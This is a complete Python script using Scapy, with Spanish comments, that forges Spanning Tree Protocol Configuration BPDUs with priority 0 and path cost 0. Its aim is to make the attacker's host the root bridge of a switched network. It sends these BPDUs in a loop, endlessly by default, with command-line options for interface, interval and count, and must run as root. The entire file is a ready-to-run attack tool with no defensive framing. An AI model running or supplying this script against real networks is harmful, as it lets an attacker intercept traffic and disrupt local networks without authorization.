#!/usr/bin/env python3

from scapy.all import *
import time, os, sys, argparse

# MAC multicast STP — destino fijo de todos los BPDUs
STP_MULTICAST = "01:80:c2:00:00:00"

def build_bpdu(iface, priority=0):
    """
    Construye un BPDU Configuration falso con
    prioridad muy baja para reclamar ser Root Bridge.
    """
    src_mac = get_if_hwaddr(iface)

    # Bridge ID del atacante: prioridad 0 + nuestra MAC
    attacker_bridge_id = priority.to_bytes(2, 'big') + \
                         bytes.fromhex(src_mac.replace(":", ""))

    pkt = (
        Ether(dst=STP_MULTICAST, src=src_mac) /
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
        STP(
            proto=0,
            version=0,
            bpdutype=0x00,          # Configuration BPDU
            bpduflags=0,
            rootid=priority,        # Prioridad del Root (nosotros)
            rootmac=src_mac,        # Nuestra MAC como Root
            pathcost=0,             # Costo 0 = estamos directamente conectados
            bridgeid=priority,      # Nuestra prioridad como Bridge
            bridgemac=src_mac,      # Nuestra MAC como Bridge
            portid=0x8001,
            age=0,
            maxage=20,
            hellotime=2,
            fwddelay=15,
        )
    )
    return pkt

def stp_root_attack(iface, priority, interval, count, verbose):
    print(f"\n{'='*55}")
    print(f"  STP Root Bridge Attack")
    print(f"  Interfaz  : {iface}")
    print(f"  Prioridad : {priority} (menor = más probable ganar)")
    print(f"  Intervalo : {interval}s entre BPDUs")
    print(f"  Paquetes  : {'Infinito' if count == 0 else count}")
    print(f"{'='*55}\n")
    print("[*] Enviando BPDUs falsos...")
    print("[*] Ctrl+C para detener\n")

    pkt   = build_bpdu(iface, priority)
    sent  = 0
    start = time.time()

    try:
        while True:
            if count != 0 and sent >= count:
                break

            try:
                sendp(pkt, iface=iface, verbose=False)
                sent += 1

                if verbose or sent % 10 == 0:
                    elapsed = time.time() - start
                    print(f"[+] BPDU enviado #{sent:>5} | "
                          f"Root MAC: {get_if_hwaddr(iface)} | "
                          f"Prioridad: {priority}")

                time.sleep(interval)

            except Exception as e:
                print(f"[!] Error: {e}")
                continue

    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start
    print(f"\n{'='*55}")
    print(f"  Total    : {sent} BPDUs enviados")
    print(f"  Tiempo   : {elapsed:.1f}s")
    print(f"{'='*55}\n")

def main():
    if os.geteuid() != 0:
        print("[!] Ejecuta con sudo")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="STP Root Attack")
    parser.add_argument("-i", "--iface",    default="eth0",  help="Interfaz (default: eth0)")
    parser.add_argument("-p", "--priority", type=int, default=0, help="Prioridad BPDU (default: 0)")
    parser.add_argument("-t", "--interval", type=float, default=2.0, help="Intervalo entre BPDUs (default: 2s)")
    parser.add_argument("-c", "--count",    type=int, default=0, help="Num BPDUs (0=infinito)")
    parser.add_argument("-v", "--verbose",  action="store_true", help="Mostrar cada BPDU")
    args = parser.parse_args()

    stp_root_attack(args.iface, args.priority, args.interval, args.count, args.verbose)

if __name__ == "__main__":
    main()

